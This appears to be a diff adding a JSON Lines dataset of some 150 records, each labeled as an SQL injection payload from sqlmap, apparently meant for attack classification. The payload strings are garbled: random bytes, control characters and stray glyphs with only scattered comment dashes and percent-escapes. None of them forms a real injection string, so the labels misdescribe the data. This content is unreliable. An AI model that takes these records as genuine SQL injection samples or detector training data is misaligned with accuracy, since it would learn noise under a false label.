+{"payload": "\u0011M;\u001a=]gt[%v,\u0017,$܏\u0004$0-K2\u0007\b\u0001\u0000vP¸8|--6鑊1\u0017_\u001b̰K?*Y,߽yx-{y\u0007!}2\u0003~F\u001fi\u0014oZ\u001fUF'H,.?䵬#j\u000e", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "VtQ@>75L\u001f2>8Uxtk\u0003LN散<5i\u0016^ۢ\u0011\u0007\br\u0018U%AC7(>=f\b|Ƿ\u0000a־\\L'\u0010YƖO\u0014,\u0001", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "~~?\u001bमHb\\\u0002RxԡRa~\u0018W)$b\u001a@;\"TM:\u0007Ѷi(!+%8@ǹlWB=f\u0019e?֬\u0010QUֱ뾞$w}NW#%6cZpgC\u0012i&", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "3SuVJ{2\u0011<ÁU3=E#Ke=ˤj($\u0015a\bx4%C-\u0006:9,Y?)\u0017YZ%8C҂Jm\u00073g}s&!drp]iie\u001fi?2nwس", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "2\u0015̮tĚ*M%a7k@>?z*\u0012~O&k\u001bwg\u0013_ۂ_\u0002a}\u0014vl摦\u0015\u0007\u00152j1\u0010\u0000Bo3", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ٺoܩ黎\\ξUW;u?ޞa\bֽ%ecէ\u00189jn\u0016YfuqnGV߶nySn|&j\u0016\u0003<v9toj\u0016\u0019JM7Q-Z<\u0010._fl\tQlwx)2ag+יS_jn8Ռ}בmni[`", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "oX]\u0004*\u0013U_y!%dcb\u0013ڳ/ZP\u0018`Qj\u00020\u0014B\u0018$c", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%d75+\"\u000eI%'qY", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0011\u0007\u001a`%0A", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "pC+Q2i$SäΑ\u0010e\u0012x\u0001¢\u0018.~}{y\u0016\u0003\u000f\u0019υ%/f:A--#g\u0014q()x\u0004v\u0019;Lj\u0003FT=S?\u0012\u0017~lkj\u0012ȁkG,{͏U^bCNd?\u0003w\u000e\u0016)R25P\t\u0013 1>\\\bnQv\\\u0003JBt1Q>C", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0007h*-SǬcڝW\u0005뢟b'p&\u000esfݖekHlok\u001aU\u001f\u0001>̦!7m[MCסa♦\u0016fКȒMh3;RE7K1n\u000e--5̓~7g\u000f~x\u00031[Iy'", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ȉ%E5aP\u00160<IvH82\u0012rŠ\u0015\u001bV\u0014}3qf?Ø\u0012\u001f\u000e-\u0005)my0'~+\u0015ˡn\u000e*T\u000eWCS]`\u0005\u0001X\u0012⾨", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "'7\"=\t9l1\u0005sd|jO~}\"HJ~$g\u0005n%׍>S.Ӳ%82JcL", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u001a{:\u000eEQOsA0--k\u0004WiA\u0014\u0019,Mh\u0007\u0003~\u0004\u0007sw>a\u001f%|", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "'SD̳1R?RN$5<%6A\u00059SBrV\u0011^H='wS\u0007ɓH?;g2\u0001$5eHCWSVc[d", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%99\u001bi", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "[,\u0006+&Zt2^oN\u0012\u0010lHmw_+}\u0013H,;X\u0017݆%`WV4'+GI;F<o%15z^Sq<-.S\u0006Nބ'\t`ǉ\u0019@\u0017\b\u00152I|C[g\u0007փy\u0013PC\u001a", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ߙEWw--ȝ\u000e=", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "w\u0018\u001bJͷ-_C\u00016&F\u001a\\6[36Yz\bs[6a--ffkwc&0TAsO=M{z.`R㏯\u0012p{9|{\u0004\u0003ݴ\u0004nMJi\u000e~?#|ܝ\u0000h\u0018>\u001bMރy|", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%29{[\u0017j0\u0001h=\u0006c}#qy}ƸUfl\u0003\u0007;!m\bk%\u001fvW'b}M%6mh\u0014\u0018pG\u0015l7g\u000fR2\u0017(\u0004\\[J.JV\u001f>\u0003\u0002\u0018Fde\u0012!4SE\u0006.s<Vp", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ")@H%9eЕaݤQ͢^", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u000f\u0017i%A/\u00121\u00148XTTQdU`M\tv>\u0016\u0016Ӳ>C8[\\-2--N", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\b+<t%34\\\u0005Iy\u0006P\u0003J\u0015h7\u00033ǯ\u001a}hQCg\u0000\u00182.\u0012I\u0011\u0015UY \u001a\"'", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "A\u0018!CSLS<.\u000fP酧$ \u0018KD+M=--$,\u001b\b\u0011\u0011r", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u001bԉM]\u001b3fM]\u0003i,C.vks+--B\u0002УO\u0017ؓ\u0006\u000fؒ\u0006Cee1\u0013\u0002ODz,\u0006d~d`M겋H8[z$9h^\"^o_/s+8):FɗQ͛G\\`\u001a\u0006GPt-y\u001f\u0016Pz0v?װN\u001fD\u0017", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "¸I\u0012;\u000eq3\u001580\u0010[<0e }t^ %be\\H", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ">VqY\u0019k$n^~k1DǓv[\u001b'Ҝ㹜\u0001r<--\u000f\u0004c\\ڶAW!", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "R\u001bK\"_4\u0001--^K\u001f,udYK", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u00058dæmS6\u000e\\VqIfcѣB\u001f%71U6\u0015h8\u001fh;>{?k\\=#At}͋kJ \tEsE&\u000f6qB", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "?KA8%3C", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0003HNzXF\u0004CJ\u0005,4bUx\u0002\"Z0\u001b\u00148\u001f%FdlǦ<v=\u000f=wDg9A̴K25\u00188^g/\u0003tzv;\"Bt;~\u0012\u0019\u0019?*u3,\u0010w", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "S=qQC(%63?w'&}\u001a0Ay*KJ\u0006Zl", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0014R%2FնR\u0012b?xW\u0017#oJ˄Uz", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "$%NZ3$&SMDq(}BXAp6\u0005f/E͛\u0001K$Qe8\u0002m)HQ\"I\u0010b\u0013J\u0004r\bhj|C>fX\u0011})X@ol--\u001bK'\u001a", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ayLUάAo;J\u001bܛa1Lt^ίhw\u0006e\u00170%bDi9շ7gTJJ\u001f!CSK\u0012", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0006D0g\u0000%)eD%cd*pHH#L\u0018^\u0003q?\u001bDR\u0011%fiI#O\u0002", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "K--\u0002H", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u000foa\u0012_\u0000I`Ͼ.(Ye2K)S\u0018i4Dw\u0006ſ%Af", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "$gƘ<qj\"1H3ԧEqExa !_E3//Ќ\u0011] \u000fB}]X[sTL%7E6NPRH\u0000%\u0017`}J\u00104\u0014(\u0019\u0001 xx_M`~nA\u0013!i\u0013T\u0011T둟~xQA>", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0006]#yU(fy\u001ah\u0011--leF)5~\u0001", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "bQ\"%De\u0016T;'I\u0013.w\u0001tDB\u000e\u00188@\u0007/a@Q7G\u001f$D\u0017$", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "kgO>\u0016]QBe\u000fdz߹U@EI{܆fhڨm%66*", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "X6[hb\u0007\u0015\u0015|\u0010Փ\u001bF\u001aS;%9fҰ{2\u000f\u0011\\{Y,<];0w\u0007$: Et=_!v\tY`", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "'Q?\tҥ\u000f\u0003F\u000fQV,WжJh\u0006\u0012H1{'̂{\u0003\u00140!WmU?yaL\u0006xT.ě%51\u0000Hs\u0002'\u0016y\u0001\u0014(", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "6%#i^=!Ǣ?oMᚮh\u0003m\u0005>OaOl:s\u0007E\u000e\u0013MՏ--\u001f\u0017", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "&v|փI:[t(\u0013pcŒSdH^%%\u0015슟خ%Ff<]72'\u0019pV0\b", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "wWjrN%7a?\u0017Rޭ$1>%9O|G-=ܟIwz?z{\u0002y~\u0014ux2Hz~.\u0018v1\u0017\u001f_7,y,\u0006yػ+$٧7\"B?-<<9IS4", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "q\u00162Y%83\u0019hbc\\", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Vg%Bfa\u0010oc9A-uqiWqz\u000fa%$9y>@^Cls", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "c\u0006!\u0015{\u0007K77`\u0001V%e2B\u0011\u0012q", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u000e5Qev)QyT\u0011Q<t̨\u001b\u0016%fdxN\u001aԘ߂j|j\u0012\u00076rZmQB#\u0012\u0014(\u0000\u0016{Ė\u00119Ӟ#\by\u0019vļ\u0003O\u001b%\u001aY8\u0000Y4kl,ȉ=qM<<44jg\u0005\u000e)6):3i8\u0016oYb\u0017qIA7r", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "{(7p\u0013eL8eO%D5$hqRŃ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "r܌_3\u0016~󓓯\u001ff\u000227\b\"A뇃\u0001\u001f^In\u0007׈32v4tb\u001f$@U\u00044\u0010,\twa_?\"P>TcQ\u0015w%8b[u*9\u0001 4\u000fJmV\u0015\u0012I6\u0017\u0003pm", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "I&|&{HR 2<\u00019_#XmBo~\u0004pO\u000e,%08h\u0007#\b\bL(.", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "}\\bϗ8\u0006Ĵ\u001fp\u0013\u00013Ӈ%R[MR3b^\u0019Xw6\t+>n\u0003l^%CA`\t\u0018\u000e4%1RRٻ//G\u00122k_<\u0015T](\u0010L=i", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ϥ\"uilXlm\u0004c\u0007\u0003?M#<~>=ґFd$\u0006`\u0003ن\t%dEt\u0005̈́", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "J!h1~Y~%9f9\u0006K/PuA~=p?7GdYxΫ~sz\u0014z<?'wY5^4=\u0005Oˎ\u0017", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "c\u0017z\u000e\u000f\u0013YLIfI(V\u001flSrq<\u0000(UR8--QB\u0002\u0000⊃CI\u0015\u0016", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "j\u0011\u0017\u0002RKx\u0016I\u0013\t~6(4\u0015O\u0002%A8ߋ7Z \u0001Nl", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0013S+$,1.԰1\\!\"1ˋw@`f%Be\u0006l\u001b擸OқIlU#(dhqE;0@*I(N<ba\"9Cn\u000f\u0018OÄk$<\u0005$Ze\b6M%˔3$ۂ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0007=97ARX\u0013\u001bk(6Ȗ--1\"D,H0TK\u0017l&\u0004H\u0003#3\u0006}O\u0018ߒTF\u0016x%[kuC;dG9;\u0011cH\u000fv`$+\u001f[GrHs\u0000+\u000eKV݄@\u001bv\u000fqkfTA`/", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "5t:uIiʄjr\u0012>%b3!0<m\u0014\u001538g-O;5 \u0012S=\"*2", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "@2C[A\u001f7h{HؐB/v\u0012<%B5\u0004", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "u-19Uk\u0018\u0003=%cC", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "S\u0017_>\u0002L%+Pm--d,pY\u001f\u0018s\u0016r_*p>[\u0006M\u0016,h\u001a\u0007\u0017T_:Nf{}\u001b'\u001aȌ\u0007l&\u0010\u0012(\u0013S\u0006\"&NBGq", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "i:FTr|p$3\u0016$!4V--\u0003S\thc", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u000e9o0g{+\u0002_+#\"H\u0010`☽?@a88E[c\u0019\u0005Z%8CLˌD)U>;?AA\u0014{w", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "jr\u0018d\u0006\u001a,MGjL\"KB=j̾f|\u0019f(KLK%97Uz'2", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0015%C6ń[{\u0004\u0016w/C\u0007\tK; rtf$׻e1\u0016*KU\u000fk\u000e6:`<\u0014GmCݮ[lU\u00047Њ\u0006yi", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "pz6b\u0019\u000e7\u000e-尩A/G\"\u0012ƥ\u0004_DӌT]8\u0003&\u0017휲?1#$f?{#Ǜ6xv>w~[R^%Cdֱ(-\u0004\u0000ﰕ3Uw\u0011\u0007]", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "4 WtA{{X:\u0004%3c%(\u000e\u001f\u00132GDȵOirQ\u0004teDOy\u0018", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0016BE^)}I_\bWn\u0015\u0018Ɏ\u001fFi\u001a\u0012Lf\u0017Uo;miDǓs@?is!%F6\u0011źz", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ǧ~a\u0011%b9\u0015CQ's^3", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "uDD%Fb@NK(BE", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "v\u0002&UrE\u0000\\\u00002\b\u000fx%A5$$s", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0016\u0010Z*`_J\u001b}pi:%F20+M\u0006_]yU+^WV-`)3^\tf", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0017j2\u00173S!%+;a(&n=b\u0016؆'kSE؄\u0003\\'M9;M\u0017l5]ΑTjGU;OTE~#H1ut\b}~\\JXG)\u0003~0\tOn2%9C%7e+V^_0e\u0005\u0012T\u001bj\u0015DdA\"_ܑK\u0018^NN\u0006\u0010oz=\bG%\u0004EH/B$\u00121zY$~QrMU\u0007\u0010o\u0013fHQ=", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "d`D(X%56Շr;ofզv)ok+\u001b4bS:\u0017XMjM-2\u0002UY].a", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "UQoW]\u0015Xo֠x?`\t(\u0002Q$T$\u001b/;\u001a\u0001\u0015W1=1\u000eA0\u001f*\u0002%n!f~\t*?ɟ\u0015L\u0002|ޫ\u0011Nm\u001bW}\bcH\u0010/mgJ:@~h\u0010U\u0010;ba\u0003\u0007SL'", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Q5{U\u001aP\u0012\u0004E\u0001~!p4,%4fsTyR&HGmYU+ş\u0002", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "A0\\%b5ڗ\u0013=&Q\u000fMI\u0016", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%29\u0016 L\u0013", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "1-*{\u0000b\b\u0004{J\u0001Ɏ5\u0004㎤L,\u0006<9G7~wZ\u0004ۯԦ6W^%e0\u0007$\tRF3DIm\u0016U93", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ɪ%a4j", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "/eo٤8/63/L%b5^,NFyxPӺĝ\u001b}\u0012MaJ,j{Q\u0014 9\u0017L\u0007&2*٥e˯_~EaX\u000f\u000flHy.", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u000f ߷ܚ;#ڝwDS(\u0017\u000f%0C!h^`c$-:\u000f?", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\"\u0012\u000f^\\\u0004\u0007̳wL}aBoWD]\u0001\u0013a%Q⻡r2d.i\u0010;%ae[ZdYtQ]5t84\u000704\u0005Er\u0007_:7\u001adM%", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "'dO,\u0001dX\u001553jG̭U\u0000XJ\u001aႈf{%b9<@\u0012Y\u001a\u00052py\u0007\u0016IסAዏ[ߘQJ1&B_ڨ!x=մ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "l%DC/m\u000e\\", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "G'lq\t\u001a--\u000e\u001aФ\u0012FXP?BÔ\u000fo\u001b\u0001dK\u0007b3ON3(W\u0011\u001bϿ\u00022Ap\u0000srAE\u0016HN\u0013wļ\u0014B\u0019I", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "|\u000e:\u0001au<jPJ>GO%01>isQ\u0016!| 9f}z~]\u0002uϴ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "j\u0011F{f69Rgۏ\u001a̯T%0F", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0003@ROSPD<X4`\u0018$:\u0018\u0010xԦ\u00003b3F\u00069\u0019cY4c3ŬRmҬPߥ1\u0016CbUb=\u001b`o!\u00106xq/-έg/mAgLliw\u00051ߥ3%5e;g\u001f-", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "{\u0016\u0017\u00049C}czIK\u0019)0m\b`k\u0011\u0001O2\u0003T\u0000\u0006*\u0004$S.su?շl\u0011)W)]I\u0015LA%Rӈ]\u0002Y.\u0015/wHOB%pva@W\t|j\u0003TTR#Pf@Zcr/f]%Z\u000e0-UTr\u0005\\yF&R^$Cu4\\\u0007piP,c\u0007~Z%%5F)o]Ug9aݞA\u001fz\u0000", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "oҼ/D4L&o̔0A0$/\u0013)TS!IPuv \u0005i[\u0014~\t_YhH\u001bN,B.Qȟ?K-/Q@_OR\t%3e\u0007\u0015=ԭ\u000eje\u0011\b߇\u0016\u00199", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u000eȤmkI;vA?,H2Y\u0012\u0006@\u0015]3D$1-d--", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "l\u0012s\u001afAU\u0003$b\u0011:02\u0014׿f.<Yv\u0017ׯ`\u0012k\u0010$ u\u0003F̨QUvo%\u0004{\u0014Y.I(8#\u0011?R\u0013%6FHUQp\u0017Li", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "h\u0017;Jsg}$`lw/:87fN\u0007G:OEf%22\u00140T\u0007$eM\u001b\u0000WE/yU\\y\u0001%q\\\u001aI", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "wWP2'~XciސyCQĺ,S%}%36wNUXB>i6'g<\\\tEg_", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "NW>--8qC\u0010ӻ,,ML.\u0005F\u0001", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "1-I^&|4<\u0006ŵAj,`qኢH\u0010\b%\u001f.%\u001fM׼\u0000\u0003\u0000ϿPT`\u00122\u0018\u0002/}R^aȧ53@Š\u0010;8^U\u000fa\u0002\u000ff\u0007~ \u0014P>ڒ;H\b_\u0000\u0018j̯HL%a3}}n\\>\u0017G*\tF\u0000HI(\u0011Ev-s\u001f;7:2s.\u001fj0l\u0002\u0013e\u0003\u001fN[mrq\u000f-s\u0010F", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%14~:;\u001fm\u001fŌ\u001aj~\u0012Dj\u0002&I\u0015f\u000ed", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "m>\u0018*%A3\u0017j\u0010GUF!j\u001a\u0016\u0019", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "(תkj|%e7K>>%d[\u0016ޑmxo2T\u0000c\\5b!hWL;\u0019\u0004\u001fB\u0001C,@ #\u0013(Ws\u0006 /~", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Xf\u00130\"\u0006w90R72DA&r&\u0014UEL%\u0015B%1a?9)Ov\u0011&\u0006;.WG\tuY\txcMcy$`2%u\txs#3\u0011\u0003y<xfv\u0017Mk", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "r\u001a\"%CEϻ=o\\i&~|\u0013\u0002b\u0000\u000f!.X&^\u0006e\u001b#lU\u0016Dg?\bf\u0003S4]'p\u0004d<x_?\u0012p\u0013wgA\u0016?T,\u0007/%5\u0005~+A0", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u001a7.QV5\u0007)\u0014ۗU!/;Iy\u0006\u0003\u001br\u001b5uSNbطf}4Z<?`=kt%03vep\u0012~]A>Wv߇\u000e{w{ܞ)S'l?&'tV>DjO\u0002b}j\u0005&\"ox-^/\u0018'a]m)z\u0017\\ؙg]\u0006\u0003*3)J\u001fO\u0000=HJbKNN\u0012rA", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "XF?%\u0018=)r vx)a\u0007|y>%cfJ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "tֈ̎%9FTe\baw^\u000f\u0003\u001f\u0002葥Xc", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "fd|~\u0004&ifK\u0011\u001bg/:\u00071j!6h5\u0007)1Wb%3aI{#~CP-2poxCĺc Ԣc7\u001f`ip^u\u0011\u0005_,Q`ej", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "j<mܨa%04]le\u0013DW,[\u0016s\u0012u\u0016x^6SL^~^\u0013j?_~k&\u0011/5{en/atFA\u00136\u0017+{", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ";\u001b_~\u0011)Z=\u0018>T{p\u000f#S3$O޿zq\u0014iܟmN=ty!z%fc", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0003sY\u0002$q\\6I%71%\u0018$\u001b\\͒[]>{L:9r1!a6O\u000fm32)\u0001\u0004)\"_\u000f\u0016\u0007>-u33.Jy\u0017_UBd\u0018P%u\u0014&s", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "@i%30HAN=\u0015\u0012o¿\u001fj'+ݣa\u0010{EG>8@v4\b]\u0019މF\u0016o\u001fj\u0014\u000enL0Y", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "or@5+\u0016\u000fθ=\u0005_O+;J8\u0005y7\u0013R#?*gރSP-\u0001C\u0000Qc>\u0010.Bj\u000eN0lR\u0016\tPy\u0017o\u0019y2$*(τ\u0016>\u000eDQ\u0007[}}VW\u001a&0\u0012\":%4E", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "4Z˗-@7C9t9G\u0005T#3\\ލXbM_>ܼC2LF k*X7b\t\u0015ڂ[\u00027%66kP<RVmb\u0011==^,", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0018\u0018TtM3@y\u0012ahJ%f8rM?Q\u0017w9}v\u0018D\u0019ߌ)\u0018al)", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Ȏf\u001fh!?\u0005\b2RW\\suݽD\u001a[6D\u00143\u0007!%6Bq\u000e`\u0013u\u0018\u001a]-P", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "}~9W\u000017¹\u0016\u0015<}\\ڃ)ZT}%3eE=D\u0000ɆFJѷpSѣYbcUSj\u0012 s(I圿\u001a^HxjCI", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "pL%2bRΨ;S{\u0000\u0003e{X18\u0007V9\u0015D\u000fe\b\u0016/\u0012tי;곻\"\u0003\u0018`9z떨\u0015o\"\u0001l3m&U\u00010g+^v9Gm&g\u0019h]Zl\u0014<>;ޞUvTYO", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "YR\u0017uY>_~ld<\u0019:;1VpD`7\"Kҿm[p=0@v%AdL9\u0015s\u0002׼ut\\QIS5d3cD-\u000f-OYi?(Sm<&<5pSn73\u0006ɞZ\\dk@Vl\b9", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "5rB%CC", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0012;'//\u0000ʨuz(`I{ZKo\b7\u0002ՔRpE%D3c\u0006˓p\u0001q2x\u0001[\u0018d>b\b_\u0016-(\u0012py6`~/9Z0AS3V/3s\u00140ٵP'$svB", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0015~?\u001f\u00144~\u0011I!--cgZ\u0004$\u0016,XqI\tFR", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0002j\u0003}Ȏ]%1A\u00049\u0012]R8mL0Q&5;", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Ӳj--P:", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "_\tsy9ݬ\u0019%6D", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0005\t\u0014;|*4`Ud\u001bD!w L\u001b%9A\u0018\u0016\u0010\u00139: yi>p\u001a`}V[lO9?tzxU%|~{_4", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "GO\u000fK0?:Pܭ\u0016R<\"\u0016\u0016ff뮼----ͼͼͼͼͼ]y^wnn=5mWZ`JqKVؙc", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "A\u0012--U)U|", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "z7hr\u0018FsdL%05Ѳ0\u0012~\u0018S\t?\u001fT\u000fc=ʷ\u0017wd>eaL%0\u0012~\u0018-\u0017", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "9ܖ%9b\u0010Pnn{&m\u0017\u0013=PFsh`", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0012-Ow;E\u001fOP\u000f5jў\u00031o%7F2\u0018=", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "e\u0016ҜXMqyR\u0012k\u0019o1\"54\u0013%7C笕lIl\u0014<[r\\T΃", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "p\u001bmx k%(5R\u000fп7e\\L\u001a9\u0011'gĻOzܭ1LOZwM\\--,)_=<j~n-$\u0006c\u0012\u0013r?KN*E\u0017d˒Q5*g:PaACb]\u000fJs\u000e;\u000eƘXl1w\u0006Ick䙧*\u0006W\tlYg\u0013", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "$J--=rڜJX+g\u0001\u0010@\u0006%XL\"i}y~w\"Ix?_W]q{I&zEn?gF", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "(\u0006\u0016QsO\u0004+\u0016o%EFK\u0015;\u0002T%ÂU", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "uJJ\u0015NektQ]k%vI]k\u0017ڕ^\u0015ݺ\t|mȘgUo]TW%uuY]]VW\u0017թ--$\u0019˘%$:c", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "?n\u00154n3_Kh\u0000c=[5[-[%11}\u0014z\u001bn\u001bn>ⷖ1f|t[^\u0000", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "_߁.\u0017\u0006|\u0012R\u0016U-da>\u0002ߞ\t(*Z%dDG\u001f\u0014\u0014y{%&wbΠBj%]\u0003Zx`L,\u0000", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ";?@ \u00065lpmvA5vH\u0004ո%b0g4&\u00180#VwJ]=xCe4(\u0018B|paW=qO3!k\u0005Z-\u0013\u0013.g15b\u0001\u0005v$R\u0000jo", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0000vmT\u0001j`)q\b\u0001,};%db\u0012\bRܹ\u001a9\u0015^`", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ϟ8l\u0003\u0018\b\u0007Ç\u001b\t\u001f\u001f~\u0004!%BD\u0019fK3~\u0011Ύi]rĩcĒ.^U3f6F?", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "q%2C\\\u0006\"i.itݯg3[\u0003", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0016#Y\u0002\u001f\u0012xBB\u0006o0 *r..֤\u0016qPmUJh0P\u001a\b\u0019g%0e\u0013ꃰ\u0018oe", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "n#\u0002ݭ\u001b--m`ٸ`Ig", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ";4\u000eGGb\u0003\\=\u0007\u000e\u0004\u0013ALKo.E\u0010Z6--DјBeo]\u0000pNc3d{Y3\u0018ߌlE2\u0000F6LfY\u0005$Da]", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "0X%d50Smϋ9Wv__jIQ\\M%9s\u0013՜jD", "attack_type": "SQLi", "source": "sqlmap"}
